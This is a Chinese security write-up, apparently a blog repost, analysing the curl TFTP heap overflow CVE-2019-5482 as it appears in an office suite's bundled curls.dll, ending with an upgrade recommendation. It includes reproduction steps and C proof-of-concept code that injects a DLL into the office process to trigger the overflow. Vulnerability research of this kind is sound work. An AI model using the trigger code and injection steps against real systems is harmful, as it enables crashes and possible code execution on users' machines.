> 原文链接: https://www.anquanke.com//post/id/216715 


# 某办公软件curls共享库堆溢出漏洞


                                阅读量   
                                **124599**
                            
                        |
                        
                                                                                    



[![](https://p4.ssl.qhimg.com/t015099993f9d8c15cf.jpg)](https://p4.ssl.qhimg.com/t015099993f9d8c15cf.jpg)



## 漏洞说明

产品：某办公软件 校园版

文件：curls.dll(7.64.1.0)

漏洞类型：堆溢出

漏洞函数：0x10042f25、0x10043744



## 漏洞分析

curl官方于2019年确认了该漏洞，同时分配了cve-2019-5482编号。该漏洞是由于客户端在设置TFTP协议的blocksize参数不当，设置了小于默认值的blocksize，这使得在后续接受服务端数据时产生堆溢出。存在漏洞的源代码位于curl库中的tftp.c中，如下：

[![](https://p0.ssl.qhimg.com/t018302ccd158e54a42.png)](https://p0.ssl.qhimg.com/t018302ccd158e54a42.png)

当用户设置了blksize后，会在首次创建连接时重新为存放服务端数据的数据指针state-&gt;rpacket.data创建对应大小的堆块，但是在接收服务端数据时，要拷贝的数据大小是默认的512，如图：

[![](https://p0.ssl.qhimg.com/t01634c32fe9097edf3.png)](https://p0.ssl.qhimg.com/t01634c32fe9097edf3.png)

[![](https://p0.ssl.qhimg.com/t01de6ff43350e6dfb7.png)](https://p0.ssl.qhimg.com/t01de6ff43350e6dfb7.png)

因此如果服务端发送了超长的数据包，就会产生堆溢出。

在该办公软件的curls.dll中存在漏洞的代码如下：

[![](https://p4.ssl.qhimg.com/t01073bf57f3fa43c6b.png)](https://p4.ssl.qhimg.com/t01073bf57f3fa43c6b.png)

[![](https://p4.ssl.qhimg.com/t01892229a923783b9a.png)](https://p4.ssl.qhimg.com/t01892229a923783b9a.png)

在该办公软件应用中，默认加载了该动态库，主要用于网络传输、访问、下载文件等。目前尚未找到直接攻击面比如通过打开文件来直接触发该漏洞，只能通过进程注入的方式调用curls.dll的内部函数来触发该漏洞。



## 漏洞复现

需要编写独立的dll程序来在该办公软件进程空间内部获取curls.dll的句柄，进而得到特定的导出函数，如`curl_easy_init`、`curl_easy_setopt`、`curl_easy_perform`、`curl_easy_cleanup`。

随后在远端监听udp 69端口，并将一个大文件指向该端口用于传输首次的tftp协议交互内容，在win7上通过创建远程线程的方式让该办公软件加载我们编写好的dll即可触发该漏洞。代码如下：

```
HANDLE curldll = GetModuleHandleA("curls.dll");
const char* testftpurl = "tftp://192.168.44.147/test.txt";
typedef CURLcode (myeasycurl)(CURL* data, CURLoption tag,...);
typedef void* curlinit(void);
typedef CURLcode curleasyperform(CURL* data);
typedef void curleasycleanup(CURL* data);
curlinit* myinit;
myeasycurl* mycurl;
curleasyperform* myperform;
curleasycleanup* mycleanup;
mycurl = (myeasycurl*)GetProcAddress((HMODULE)curldll, "curl_easy_setopt");
myinit = (curlinit*)GetProcAddress((HMODULE)curldll, "curl_easy_init");
myperform = (curleasyperform*)GetProcAddress((HMODULE)curldll, "curl_easy_perform");
mycleanup = (curleasycleanup*)GetProcAddress((HMODULE)curldll, "curl_easy_cleanup");
CURL* curl;
CURLcode res;
curl = (CURL*)myinit();
mycurl(curl,CURLOPT_URL,testftpurl);
mycurl(curl, CURLOPT_TFTP_BLKSIZE, 20);
res = myperform(curl);
mycleanup(curl);
```

接下来利用windbg附加***office.exe程序，利用注入工具将我们的dll加载到***office中，触发tftp请求，随后产生如下错误：

[![](https://p1.ssl.qhimg.com/t01d028a8965410bd90.png)](https://p1.ssl.qhimg.com/t01d028a8965410bd90.png)

错误类型如下：

[![](https://p4.ssl.qhimg.com/t0174de8038e6dc9cad.png)](https://p4.ssl.qhimg.com/t0174de8038e6dc9cad.png)

可以看出是堆相关的错误，由于堆溢出造成了已经free的堆的头部遭到了破坏，而在申请堆时会对堆头进行检查，如果检查没有通过则会抛出异常，最终导致应用程序崩溃，如果是经过精心构造的数据，也可能会造成任意代码执行。

在相关的函数下断后，观察申请到的堆块如下：

[![](https://p1.ssl.qhimg.com/t01052457b70e4658e4.png)](https://p1.ssl.qhimg.com/t01052457b70e4658e4.png)

堆块的大小为50个字节，接收数据后如下：

[![](https://p1.ssl.qhimg.com/t01c23791237ad1510a.png)](https://p1.ssl.qhimg.com/t01c23791237ad1510a.png)

已经将其它堆的内容覆盖掉，在后续堆管理器对被覆盖的堆进行操作时就可能触发崩溃。



## 修复建议

直接升级到curl官方的最新版，因为该版本下还有多个高危漏洞。



## 漏洞演示

[https://www.bilibili.com/video/BV1TK4y1a7XX/](https://www.bilibili.com/video/BV1TK4y1a7XX/)
